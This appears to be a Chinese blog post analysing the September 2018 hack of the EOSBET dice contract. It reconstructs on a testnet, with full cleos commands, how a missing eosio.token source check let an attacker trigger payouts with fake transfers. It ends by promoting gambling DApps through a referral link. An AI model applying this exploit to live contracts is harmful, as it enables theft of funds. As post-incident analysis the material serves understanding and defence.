# BET被黑客攻击始末，实锤还原作案现场和攻击手段


## 前言 

今天中午吃饭的时候，整个微信群讨论的沸沸扬扬的一件事，莫过于大名鼎鼎的日收万金的EOS大赌场：[eosbet](https://eosbet.io) 被黑客攻击了。

eosbet，一向以团队技术实力强劲，代码安全性、容错性高为业界佳话。凭借 一款dice游戏，火遍全球，快速发展成全网第一的杀手DAPP。

截止目前为止， eosbet短短半个月，收入40多万EOS。

DAPP排行榜上，交易流水第一。


![](https://ws4.sinaimg.cn/large/006tNbRwgy1fv95jwkjqbj31kw0iiq9c.jpg)


目前官方网站和游戏网站已经关闭。估计官方正在积极处理这件事情。

https://eosbet.io
https://dice.eosbet.io


## 调查作案现场

账号[aabbccddeefg](https://eosflare.io/account/aabbccddeefg) ，利用合约漏洞，无成本薅走 bet 奖池将近 5万EOS。

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fv95qghmn0j31kw15z7c8.jpg)

一瞬间，开发者技术群热闹极了，除了表示对黑客技术的敬佩。都在猜测、分析攻击手段。

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fv96h93ef7j30m814iq5c.jpg)

于此同时，bet官方紧急发表声明，并且关闭了游戏：

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fv95w2mgcij30t603iq3f.jpg)

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fv95vz7o53j30rs046t9a.jpg)



## 分析结果

群里高手众多，一大堆分析和猜测，最终得出了结论，并发表了一篇文章：

[How EOSBET attacked by aabbccddeefg](https://www.reddit.com/r/eos/comments/9fpcik/how_eosbet_attacked_by_aabbccddeefg/)

这篇文章，解释了 bet 是如何被攻击的。以及应该如何避免。

死因非常非常简单： **竟然是代码中没有判断代码调用来源 是否是eosio.token**

这是非常低级的错误，照理说，不应该出现在 bet这样的项目里吧？？

其实，这应该说是真正的原因了。但是有趣的事情来了：

bet官方关注了这篇文章，并且留言了：

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fv961avmy0j31fk0ysah2.jpg)

官方解释说，是的，我们确实被攻击了， 但你说的这种小错误，我们强力的开发团队，是不会犯的。事情比你想象中严重的多。

意思就是，黑客是用了更匪夷所思的漏洞咯？？

这个确实把我们开发者群集体吓了一跳，一度怀疑EOS价格会因此暴跌，因为假如存在这样的漏洞，那么现有的EOS上的DAPP，无一能幸免。

说来也巧了， 分析还没完了，另一个 DAPP也被攻击了

[https://eos.win/dice](https://eos.win/dice)

同样的dice游戏，不一样的项目方，排名稍微落后于bet。

同一个黑客，用同样的手段。 转走大量EOS。。

https://eos.win/dice 现在已经被迫暂停游戏了。


。。你以为事情这样就结束了么。


接下来，更劲爆的消息是，除了赌场，连去中心化交易所 [newdex](https://newdex.io/)，也被用同样的手段攻击了。。



此时此刻，排名前十的EOS dapp，有3个倒在黑客的~~怀里~~ 脚下。


![](media/15369152859150.jpg)


这样的巧合同时发生，我们也怀疑起上文提到的攻击方式。

攻击方式，真的仅仅是缺少了对 “eosio.token” 的判断么？？

还是真的存在 **毁灭性bug**， 足以让现有的DAPP全部阵亡 ？

这一切，需要用实际操作，去还原作案现场和攻击手段，才能断论。


## 还原作案现场

还原现场，我们需要案发时的 wast 和 abi文件。

但是bet官方已经紧急更新了合约代码，也就是说，案发现场，被官方自己破坏了。

不过还在，开发者群里，有小伙伴保留着 9月12号时的代码。也就是，我们能够还原案发现场。

在测试网，部署前天的代码，实现一遍攻击方式，看看是否有效。

前天的代码，我放在了github。有兴趣的技术小伙伴，都可以自行还原案发现场，扮演一会攻击者。

```

// 这些代码是9月12号前 用get code 拉下来的。所以，我只是还原了作案现场。事情不是我干的。是大神v5。

cleos -u http://api1.eosasia.one  get code  -a betdice.abi -c betdice.wast eosbetdice11
cleos -u http://api1.eosasia.one  get code  -a safetransfer.abi -c safetransfer.wast safetransfer

// create account 
cleos create account eosio eosbetdice11 EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi
cleos create account eosio safetransfer EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi
cleos create account eosio eosbetcasino EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi

// set code
cleos set code eosbetdice11 /Users/joe/Workspace/eos-project/eos-bet-dice/betdice.wast
cleos set abi eosbetdice11 /Users/joe/Workspace/eos-project/eos-bet-dice/betdice.abi

cleos set code safetransfer /Users/joe/Workspace/eos-project/eos-bet-dice/safetransfer.wast
cleos set abi safetransfer /Users/joe/Workspace/eos-project/eos-bet-dice/safetransfer.abi

// set permission
cleos set account permission eosbetdice11 active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"eosbetdice11","permission":"eosio.code"},"weight":1}]}' owner -p eosbetdice11@owner
cleos set account permission safetransfer active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"safetransfer","permission":"eosio.code"},"weight":1}]}' owner -p safetransfer@owner
cleos set account permission safetransfer active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"eosbetdice11","permission":"eosio.code"},"weight":1}]}' owner -p safetransfer@owner

cleos set account permission eosbetcasino random '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[]}' owner -p eosbetcasino@owner


// initcontract 
cleos push action eosbetdice11 initcontract '{"randomness_key":"EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi"}' -p eosbetcasino

// test
cleos push action eosbetdice11 transfer '{"from":"joetothemoon","to":"eosbetdice11","quantity":"10.0000 EOS","memo":"88-okbtozhemoon-"}' -p joetothemoon

// result 
cleos get actions joetothemoon

cleos get table eosbetdice11 eosbetdice11 activebets

// try resolvebet (先用 get table eosbetdice11 eosbetdice11 activebets 获取 bet_id, 签名替换为你的私钥对应生成签名。
cleos push action eosbetdice11 resolvebet '{"bet_id":"13268895739635552667", "sig":"SIG_K1_JyLrnpivQrsrmfaFqpk8168zS3sAxVi91KWb3MCkU5uBNrj52h7GPp5HMSxxdA3y9yMPHpQSWw1PNn4kJojMAHK2kK9fRY"}' -p eosbetcasino@random


```

步骤稍微讲解下，就是在测试网，创建相关账号，然后部署合约，然后执行攻击手段，然后开奖，成功证明，确实是 缺少了 判断 “eosio.token” 引起的。


先执行 ：

```
// test
cleos push action eosbetdice11 transfer '{"from":"joetothemoon","to":"eosbetdice11","quantity":"10.0000 EOS","memo":"88-okbtozhemoon-"}' -p joetothemoon

```

也就是直接调用 合约的 tranfer ：

发现执行成功。


获取等待开奖的下注记录：

```

cleos get table eosbetdice11 eosbetdice11 activebets

```

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fv96n6cw7jj30yq0k6tct.jpg)

由于bet 的开奖方式，是先生成下注记录，然后在用一个号来开奖，所以，我们手动一步步还原的过程中，下注记录是存在的，

接下来，就是调用开奖了：获取bet_id， 然后用  eosbetcasino 开奖

```
// try resolvebet (先用 get table eosbetdice11 eosbetdice11 activebets 获取 bet_id, 签名替换为你的私钥对应生成签名。
cleos push action eosbetdice11 resolvebet '{"bet_id":"13268895739635552667", "sig":"SIG_K1_JyLrnpivQrsrmfaFqpk8168zS3sAxVi91KWb3MCkU5uBNrj52h7GPp5HMSxxdA3y9yMPHpQSWw1PNn4kJojMAHK2kK9fRY"}' -p eosbetcasino@random

```

这里的开奖方式注意下，需要传入一个签名。请自己去生成。

从直接调用 tansfer ，到生成下注记录，再到调用开奖。

结论已经很明显了。

**根本不存在什么毁灭性bug，只是有一个程序员要祭天了而已..**


## 事后诸葛亮

为什么 bet这样的团队，会犯这样低级的错误？

原因猜测， bet团队，并没有暴漏tranfer 接口到abi里。

于是疏忽大意了，以为黑客就无法直接调用 tranfer。

事实上，就是 abi接口里不暴漏。依然可以被调用。

大神称之位： **onchain攻击**。详细参考：

https://zhuanlan.zhihu.com/p/42903901?utm_source=wechat_session&utm_medium=social



那为什么 win、 newdex 等项目也会跟着被攻击？

据技术大神达峰兄推测，很可能是这些项目方，一起照搬了以下文章的代码片段：

https://eosio.stackexchange.com/questions/421/how-to-do-something-when-your-contract-is-an-action-notification-recipient-like


可见这个问题，很有可能存在于很多项目里。于是，很多人开始发假币了，到各个DAPP试试，看能不能捡个漏。

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fv96z2bcexj30gy0dowf2.jpg)


## 结论

EOS DAPP 开发领域，真的是超早期。 

存在各种人为bug。

各种匪夷所思的攻击手段。

离杀手级商用DAPP的面世，我们还有很多很多的坑要踩。

今天的事，是开发者写的代码的问题。

对EOS这个强大的公链基础设施的信仰不用动摇。

那么类似的游戏都不能玩了么？ 

我觉得不是，菠菜游戏和区块链天然完美结合。

区块链的特性，和菠菜游戏，有很好的结合点，在风雨飘摇的DAPP圈子里，还有些值得我们肯定的项目：


我下面就推荐几款不错的DAPP：

### EOS Knights

比如排行榜第二名：EOS Knights 骑士，就是一款正经的区块链游戏，做工精良，日活位居第二

![](https://ws4.sinaimg.cn/large/006tNbRwgy1fv9789ihv7j30ls128wj3.jpg)

比如排行榜：

类似的 dice游戏，

###  ITE dice
还有 排名第三的 ITE dice，该项目后来居上，目前关注度颇高。

利用了区块链的公开、透明性质，使用了人人坐庄，平台中立的设计。从根本上，解决了菠菜游戏中，庄家无法自证清白的弊病，笔者体验了下，确实很不错。

该游戏目前不需要用EOS玩，而是用ITE coin玩。有需要体验的可以找我要 ITE coin。

然后用我的专属链接挑战我：

https://dice.ite.zone?ref=joetothemoon&bk=joetothemoon

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fv97qkjzqaj31kw0tth9z.jpg)

###  EOS Shadows

[简影游戏](https://eosbao.io/)，该项目，是一群有理想的学生朋友，利用区块链的特性，为自己融资，在用开发出来的DAPP给投资者分红。利用了bancor算法，可以说，是早期的 IBO 践行者了。

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fv97qv9ryej31kw0zs47i.jpg)


###  Fair dice

[Fair dice](http://dapp.pub/dice/) 是一位我个人十分佩服的技术大神亲手开发的一个Dice项目：

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fv97r4w08fj31kw10sahz.jpg)


有人会说，怎么看起来 和bet 一模一样呢？

你错了，大神想做的，只是开发出一个真正的 Dice游戏，他只是为了提供完美的概率游戏解决方案，

前端这种东西，他才懒得开发，所以才直接负责了bet。

虽然前端一样，但本质上，这已经是一款真正的公平的区块链菠菜游戏。

代码已经开源，看完不禁为大神的代码质量所折服。

https://github.com/Dappub/fairdicegame

DAPP 开发者领域的发展，需要的是更多这样愿意奉献的开发者！！

致敬那些无私开源高质量代码的开发者。币圈太乱。EOS to the moon 靠你们了。





